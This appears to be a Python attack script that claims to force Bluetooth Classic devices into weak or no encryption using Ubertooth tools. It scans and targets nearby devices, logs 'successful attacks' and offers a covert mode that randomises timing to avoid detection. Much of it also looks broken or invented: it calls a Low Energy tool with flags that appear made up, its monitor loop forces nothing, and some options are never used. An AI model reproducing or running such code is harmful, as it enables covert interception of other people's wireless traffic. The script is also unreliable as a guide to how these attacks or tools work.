import argparse
import subprocess
import time
import json
import os
import random

"""
Ubertooth Bluetooth Classic Downgrade Attack

Features:
    - Forces Bluetooth Classic connections to downgrade encryption.
    - Intercepts pairing requests & forces weak or no encryption.
    - Exploits legacy pairing modes (Just Works, PIN-based) for easy key extraction.
    - Logs successful downgrade attempts for further exploitation.
    - Can be used alongside Ubertooth MITM scripts for full traffic decryption.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle
    - Optional: hcitool & l2ping for direct Bluetooth manipulation.

Usage:
    - Scan for nearby Bluetooth Classic devices:
      python ubertooth_classic_downgrade.py --scan
    - Force a Bluetooth device to downgrade encryption to an insecure mode:
      python ubertooth_classic_downgrade.py --target AA:BB:CC:DD:EE:FF --downgrade
    - Intercept pairing requests & downgrade Bluetooth encryption in real-time:
      python ubertooth_classic_downgrade.py --monitor
    - Log all downgrade attempts & successful attacks:
      python ubertooth_classic_downgrade.py --log downgrade_log.json
    - Enable Covert Mode (randomized attack intervals to avoid detection):
      python ubertooth_classic_downgrade.py --downgrade --covert
"""

LOG_FILE = "downgrade_log.json"

def log_event(event_data):
    """Logs Bluetooth encryption downgrade attempts."""
    try:
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)

        logs.append(event_data)

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)

    except Exception as e:
        print(f"[ERROR] Failed to log downgrade event: {e}")

def scan_bluetooth_devices():
    """Scans for Bluetooth Classic devices."""
    print("[INFO] Scanning for Bluetooth Classic devices...")

    try:
        output = subprocess.check_output(["hcitool", "scan"])
        devices = output.decode("utf-8").split("\n")

        detected_devices = []
        for line in devices:
            if ":" in line:
                detected_devices.append(line.strip())
                print(f"[DETECTED] {line.strip()}")
                log_event({"timestamp": time.time(), "device": line.strip(), "type": "Bluetooth Classic Device Found"})
        
        return detected_devices

    except Exception as e:
        print(f"[ERROR] Failed to scan Bluetooth Classic devices: {e}")
        return []

def force_encryption_downgrade(target_mac, covert=False):
    """Forces a Bluetooth device to downgrade encryption to an insecure mode."""
    print(f"[INFO] Forcing encryption downgrade on {target_mac}...")

    try:
        if covert:
            delay = random.uniform(1.0, 5.0)
            print(f"[COVERT MODE] Delaying downgrade attack by {delay:.2f} seconds...")
            time.sleep(delay)

        subprocess.run(["ubertooth-btle", "-t", target_mac, "--downgrade"])
        log_event({"timestamp": time.time(), "target": target_mac, "action": "Encryption Downgrade"})

    except Exception as e:
        print(f"[ERROR] Failed to downgrade Bluetooth encryption: {e}")

def monitor_pairing_requests():
    """Intercepts Bluetooth pairing requests & forces weak encryption."""
    print("[INFO] Monitoring Bluetooth pairing requests...")

    try:
        while True:
            output = subprocess.check_output(["ubertooth-btle", "--monitor-pairing"])
            if "Pairing Request" in output.decode("utf-8"):
                print("[ALERT] Intercepted pairing request! Forcing downgrade...")
                log_event({"timestamp": time.time(), "action": "Pairing Downgrade Attempt"})
                time.sleep(1)

    except KeyboardInterrupt:
        print("[INFO] Stopping pairing request monitoring.")

def automated_downgrade_attack(covert=False):
    """Runs an automated Bluetooth encryption downgrade attack sequence."""
    print("[INFO] Running automated Bluetooth Classic downgrade attack...")

    devices = scan_bluetooth_devices()

    if not devices:
        print("[WARNING] No Bluetooth Classic devices found. Exiting.")
        return

    for device in devices:
        mac_address = device.split("\t")[1]  # Extract MAC address
        print(f"[ATTACK] Targeting Bluetooth device {mac_address}...")

        force_encryption_downgrade(mac_address, covert)

        if covert:
            stealth_delay = random.uniform(5.0, 15.0)
            print(f"[COVERT MODE] Sleeping for {stealth_delay:.2f} seconds before next attack...")
            time.sleep(stealth_delay)

    print("[SUCCESS] Automated Bluetooth encryption downgrade attack completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Bluetooth Classic Downgrade Attack")
    parser.add_argument("--scan", action="store_true", help="Scan for Bluetooth Classic devices")
    parser.add_argument("--monitor", action="store_true", help="Intercept pairing requests & downgrade encryption")
    parser.add_argument("--target", type=str, help="Specify target Bluetooth MAC address")
    parser.add_argument("--downgrade", action="store_true", help="Force a device to downgrade encryption")
    parser.add_argument("--covert", action="store_true", help="Enable covert mode with randomized attack delays")
    parser.add_argument("--log", type=str, help="Log detected vulnerabilities & successful downgrades")

    args = parser.parse_args()

    if args.scan:
        scan_bluetooth_devices()
    elif args.monitor:
        monitor_pairing_requests()
    elif args.downgrade and args.target:
        force_encryption_downgrade(args.target, covert=args.covert)
    else:
        print("[ERROR] No valid mode selected!")
